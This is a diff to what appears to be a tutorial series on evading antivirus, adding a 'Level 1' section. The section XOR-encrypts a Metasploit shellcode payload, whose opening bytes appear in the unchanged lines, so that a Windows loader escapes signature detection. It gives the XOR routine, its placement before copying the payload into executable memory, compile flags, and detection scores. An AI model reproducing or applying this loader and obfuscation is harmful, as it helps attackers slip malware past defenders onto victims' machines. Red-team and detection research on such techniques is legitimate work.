@@ -67,7 +67,7 @@ To begin with, we write a program to execute our shell code with the help of a p
 #include <windows.h>
 
 
-// Payload String
+// Payload String - Level0
 unsigned char payload[] = {
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
     0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
@@ -160,4 +160,62 @@ This should create a `level0.exe` executable file in the current directory which
 We see that most AV engines flag the binary and rightfully so because it barely contains any obfuscation and Metasploit payloads have well-defined signatures at this point.
 
 [**Antiscan Score: x/26**]()
+
 ![Level0 Analysis]()
+
+## Level 1 - XOR it!
+
+The next thing we do is try to try be a little sneaky and encrypt the payload using the simplest encryption technique out there: XOR'ing it. 
+
+With our payload from Level0, any dumb stupid AV engine can just run a simple signature check or even use something like the `strings` command to know that the executable hence produced is major sus. [It would be kinda worrying if it didn't flag this simple thing]
+
+Now coming back to XOR, we would first need a key to encrypt stuff with. For this, I chose a string which was already present in the Level0 executable so as to not arouse any suspicion.
+
+We can then obtain the encrypted string from our `obfuscator.py` script using `Obsfucator.level1()`. As for the executable code, just for the sake of readibilty we add a header file `headers/obfuscators.h`  which contains the `XOR` function:
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+// XOR two strings
+void XOR(unsigned char * payload, unsigned int payload_len, const char * xor_key, unsigned int xor_key_len){
+    int j;
+
+    j = 0;
+    for (int i = 0; i < payload_len; i++) {
+        if (j == xor_key_len) j = 0;
+
+        payload[i] = payload[i] ^ xor_key[j];
+        j++;
+    }
+}
+
+```
+
+And then, we call the `XOR()` function right before copying the payload to the target memory address. 
+
+```c
+...
+...
+XOR(payload, payload_len, XOR_KEY, xor_key_len);
+
+// Copy payload to new buffer
+RtlMoveMemory(exec_mem, payload, payload_len);
+...
+...
+```
+
+Finally, we compile it with:
+
+```
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\level0.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
+```
+
+### Antiscan Analysis
+
+The encryprion does bring down the detection rates a bittle but still, there are ways to go :)
+
+[**Antiscan Score: x/26**]()
+
+![Level1 Analysis]()
